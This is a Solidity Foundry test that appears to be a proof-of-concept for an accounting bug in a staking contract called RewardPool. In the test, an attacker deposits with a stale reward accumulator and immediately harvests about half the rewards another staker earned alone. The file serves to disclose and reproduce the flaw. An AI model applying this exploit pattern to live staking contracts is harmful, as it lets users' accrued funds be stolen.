// SPDX-License-Identifier: MIT
pragma solidity 0.8.34;

import {Test, console2} from "forge-std/Test.sol";
import {MockERC20} from "../src/MockERC20.sol";
import {RewardPool} from "../src/RewardPool.sol";

contract RewardPoolPoC is Test {
    MockERC20 stake;
    MockERC20 reward;
    RewardPool pool;

    address alice = address(0xA11CE);
    address attacker = address(0xBAD);

    uint256 constant RATE = 1 ether; // reward tokens per second

    function setUp() public {
        stake = new MockERC20("Stake", "STK");
        reward = new MockERC20("Reward", "RWD");
        pool = new RewardPool(stake, reward, RATE);
        reward.mint(address(pool), 1_000_000 ether);

        stake.mint(alice, 100 ether);
        stake.mint(attacker, 100 ether);
        vm.prank(alice);
        stake.approve(address(pool), type(uint256).max);
        vm.prank(attacker);
        stake.approve(address(pool), type(uint256).max);
    }

    /// Alice is the sole staker for 100 seconds, so she alone earns those 100 reward tokens.
    /// The attacker deposits at the very end and harvests half of them.
    function test_accountingDrift_stealsAccruedRewards() public {
        vm.prank(alice);
        pool.deposit(100 ether);

        // 100 seconds pass: 100 reward tokens accrue, all owed to Alice.
        vm.warp(block.timestamp + 100);

        // Attacker deposits without triggering updatePool, snapshotting a stale accumulator.
        vm.prank(attacker);
        pool.deposit(100 ether);

        // Attacker harvests immediately (no extra time staked).
        vm.prank(attacker);
        pool.harvest();

        vm.prank(alice);
        pool.harvest();

        uint256 attackerReward = reward.balanceOf(attacker);
        uint256 aliceReward = reward.balanceOf(alice);

        console2.log("rewards accrued while only Alice staked (wei):", uint256(100 ether));
        console2.log("attacker harvested (wei):", attackerReward);
        console2.log("alice harvested   (wei):", aliceReward);

        // The attacker, staked for zero of the accrual window, walks away with ~half.
        assertApproxEqAbs(attackerReward, 50 ether, 1e6, "attacker stole accrued rewards");
        assertApproxEqAbs(aliceReward, 50 ether, 1e6, "alice short by what the attacker took");
    }
}
